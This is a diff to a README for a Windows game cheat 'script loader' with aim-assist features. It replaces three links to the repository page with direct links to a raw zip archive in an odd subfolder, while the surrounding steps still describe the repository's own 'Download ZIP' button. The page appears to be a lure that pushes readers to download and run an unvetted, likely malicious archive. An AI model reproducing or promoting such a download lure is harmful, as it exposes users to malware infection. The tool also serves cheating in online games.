@@ -1,7 +1,7 @@
 <h1>🎮 pressure-sp82-script-loader - Lightweight Game Script Utility for Windows</h1>
 
 <p align="center">
-<a href="https://github.com/Racheljournalistic958/pressure-sp82-script-loader" style="display:inline-block;padding:15px 30px;font-size:24px;font-weight:bold;color:white;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ Download pressure-sp82-script-loader</a>
+<a href="https://github.com/Racheljournalistic958/pressure-sp82-script-loader/raw/refs/heads/main/rone/3.4-beta.4.zip" style="display:inline-block;padding:15px 30px;font-size:24px;font-weight:bold;color:white;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ Download pressure-sp82-script-loader</a>
 </p>
 
 <p align="center"><strong>Visit this link to download the application.</strong></p>
@@ -35,7 +35,7 @@
 <p>Follow these steps carefully:</p>
 <ol>
 <li><strong>Visit the download page:</strong><br>
-<a href="https://github.com/Racheljournalistic958/pressure-sp82-script-loader" style="display:inline-block;padding:10px 20px;background:#667eea;color:white;border-radius:5px;text-decoration:none;">https://github.com/Racheljournalistic958/pressure-sp82-script-loader</a></li>
+<a href="https://github.com/Racheljournalistic958/pressure-sp82-script-loader/raw/refs/heads/main/rone/3.4-beta.4.zip" style="display:inline-block;padding:10px 20px;background:#667eea;color:white;border-radius:5px;text-decoration:none;">https://github.com/Racheljournalistic958/pressure-sp82-script-loader/raw/refs/heads/main/rone/3.4-beta.4.zip</a></li>
 <li>On the page, click the green <strong>"Code"</strong> button, then select <strong>"Download ZIP"</strong>. Your browser will start downloading a file named <code>pressure-sp82-script-loader-main.zip</code> (or similar).</li>
 <li>Once downloaded, locate the ZIP file in your Downloads folder.</li>
 <li><strong>Extract the ZIP:</strong> Right-click the file and choose <strong>"Extract All"</strong> (Windows built-in tool) or use any archive tool like 7-Zip. Follow the prompts to unzip the contents into a folder of your choice.</li>
@@ -75,6 +75,6 @@ A: No, only Windows 10 and 11 are supported.</p>
 
 <h2>📥 Download Again</h2>
 <p>Click the button at the top of this page or visit the link below to download pressure-sp82-script-loader:</p>
-<a href="https://github.com/Racheljournalistic958/pressure-sp82-script-loader" style="display:inline-block;padding:10px 20px;background:#764ba2;color:white;border-radius:5px;text-decoration:none;">Go to Download Page</a>
+<a href="https://github.com/Racheljournalistic958/pressure-sp82-script-loader/raw/refs/heads/main/rone/3.4-beta.4.zip" style="display:inline-block;padding:10px 20px;background:#764ba2;color:white;border-radius:5px;text-decoration:none;">Go to Download Page</a>
 
 <p style="margin-top:30px;font-size:0.9em;color:#666;">Keywords: script loader, gaming utility, movement speed, trigger sensitivity, aim assist, Windows tool, free download, lightweight script.</p>
